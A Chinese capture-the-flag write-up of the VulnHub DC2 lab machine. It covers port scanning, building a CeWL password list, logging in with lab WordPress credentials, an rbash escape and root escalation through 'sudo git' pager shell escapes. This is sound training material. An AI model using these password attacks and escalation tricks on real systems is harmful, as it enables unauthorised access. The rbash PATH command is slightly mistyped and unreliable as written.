# VulnHub - DC2 靶机渗透测试

## 一、靶机信息

| 项目     | 内容                               |
| -------- | ---------------------------------- |
| 靶机 IP  | `172.20.10.8`                      |
| 开放端口 | `80/tcp`、`7744/tcp`               |
| Web 服务 | HTTP                               |
| 主要技术 | WordPress、CeWL、Hydra、Linux 提权 |
| 实战目标 | 获取 root 权限并找到最终 Flag      |

## 二、信息收集

### 1. 主机发现

确定靶机 IP：

```
172.20.10.8
```

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

### 2. 端口扫描

使用 Nmap 扫描开放端口：

```
nmap -p- 172.20.10.8
```

扫描结果：

```
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu
```

初步判断：

- 80：HTTP 服务，优先进行 Web 信息收集。
- 7744：开放的其他服务，需要进一步识别具体协议和用途，不能仅凭端口号判断服务类型。
- <img src=".\images\02.png" alt="01" style="zoom:33%;" />

## 三、Web 信息收集与密码爆破

### 1. 访问 Web 服务

访问：

```
http://172.20.10.8
```

发现 WordPress 网站。

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

### 2. 获取 Flag 1 线索

页面提示：

```
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.
```

分析：

- `cewl` 是关键词，提示使用 CeWL 根据网站内容生成专属密码字典。
- `More passwords` 暗示需要进行密码字典爆破。
- `Log in as one... If you can’t find it, log in as another` 暗示存在多个可登录用户。

### 3. CeWL 生成密码字典

使用 CeWL 爬取网站内容，提取页面中出现的单词：

```
cewl http://172.20.10.8 -w password.txt
```

原理：

CeWL 会爬取目标网站页面，并提取其中的单词，生成针对目标网站的密码字典。

相比直接使用常见密码字典，这种方式可能更容易命中网站管理员设置的弱口令。

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

### 4. 用户名收集

获得的用户名：

```
admin
jerry
tom
```

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

### 5. 密码爆破与登录

结合用户名和 CeWL 生成的密码字典，进行密码验证。

最终获得：

| 用户名 | 密码       |
| ------ | ---------- |
| jerry  | adipiscing |
| tom    | parturient |

这两个账号均可用于后续登录验证。

## 四、Flag 2：寻找 WordPress 的其他入口

登录后发现Flag 2 提示：

```
If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```

分析：

提示 WordPress 可能存在漏洞利用的捷径，但也暗示可以寻找其他入口。

本次实战记录中，重点是利用已发现的账号登录 WordPress，并继续寻找其他可利用的入口。

成功获取 Flag 2。

<img src=".\images\06.png" alt="01" style="zoom:33%;" />

## 五、Flag 3：用户切换

用ssh远程登录tom账户后，发现存在rbash限制，用vi查看Flag 3 提示：

```
Poor old Tom is always running after Jerry.
Perhaps he should su for all the stress he causes.
```

分析：

这里的关键字是 `su`，暗示需要进行 Linux 用户切换。

Tom 和 Jerry 是两个不同的 Linux 用户，结合提示，尝试从当前用户切换到另一个用户。

```
su jerry
```

根据当前用户和已获得的密码进行身份切换。

知识点：

- `su`：切换 Linux 用户身份。
- `whoami`：查看当前用户。
- `id`：查看当前用户 UID、GID 和所属组。

## 六、Flag 4：Linux 权限提升

rbash限制导致su等命令无法使用，因此，先进行rbash绕过：改变PATH环境变量

```
BASH_CMDS[a]=/bin/bash
export PATH=PATH:/bin
```

绕过成功后，su到 jerry 用户下，读取Flag 4 提示：

```
Good to see that you've made it this far - but you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now. :-)

Go on - git outta here!!!!
```

分析：

最后一句：

```
Go on - git outta here!!!!
```

重点关注 `git`，暗示 Git 可能是最终提权的关键。

### 1. 检查 sudo 权限

使用 Jerry 用户执行：

```
sudo -l
```

发现：

当前用户可以通过 sudo 以 root 权限执行 git。

说明当前用户存在可利用的 sudo 配置。

### 2. 利用 Git 提权

Git 如果被配置为允许通过 sudo 执行，那么可以结合 Git 自带的配置功能执行其他命令。

使用：

```
sudo git -p help config
```

进入 Git 帮助分页界面后，输入：

```
!/bin/bash
```

如果当前 Git 分页器允许执行外部命令，即可获得 root Shell。

验证：

```
whoami
```

返回：

```
root
```

至此，成功获取 root 权限，进而读取到Final-Flag。

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

## 七、最终结果

| Flag       | 对应过程                | 关键知识点                   |
| ---------- | ----------------------- | ---------------------------- |
| Flag 1     | WordPress 用户登录      | CeWL、密码字典、账号收集     |
| Flag 2     | 寻找 WordPress 其他入口 | WordPress 信息收集与漏洞利用 |
| Flag 3     | 用户身份切换            | `su`                         |
| Flag 4     | Linux 权限提升          | `sudo -l`、Git 提权          |
| Final Flag | 获取 root 权限          | Linux 权限管理               |

最终验证：

```
whoami
root
```

## 八、实战总结

本次靶机主要训练了三个方面：

1. **Web 信息收集与密码攻击**
   - 通过网站内容生成专属密码字典。
   - 识别网站用户。
   - 结合字典进行密码验证。
2. **Linux 用户管理**
   - 理解 `su` 的使用。
   - 根据不同用户的权限寻找下一步突破口。
3. **Linux 本地权限提升**
   - 使用 `sudo -l` 检查当前用户的 sudo 权限。
   - 发现具有 root 权限的 Git 命令。
   - 利用 Git 分页器执行外部命令，获得 root Shell。

### 本次涉及的工具与命令

| 工具 / 命令 | 用途                           |
| ----------- | ------------------------------ |
| Nmap        | 主机端口扫描、服务识别         |
| CeWL        | 根据网站内容生成密码字典       |
| Hydra       | 在线账号密码爆破（如实际使用） |
| WordPress   | Web 信息收集与入口探索         |
| `su`        | Linux 用户切换                 |
| `sudo -l`   | 查看 sudo 授权规则             |
| Git         | 利用错误的 sudo 配置进行提权   |
| `whoami`    | 验证当前身份                   |

### 个人复盘

这次靶机让我进一步理解了 Web 入口和 Linux 本地提权之间的衔接关系。

渗透测试并不是拿到一个 Web 账号就结束了，还需要继续寻找系统中的其他用户，尝试进行rbash绕过拿到更高的权限配置和可利用程序。

尤其是 `sudo -l`，在获得普通用户 Shell 后值得优先检查。错误的 sudo 配置可能直接导致普通用户获得 root 权限。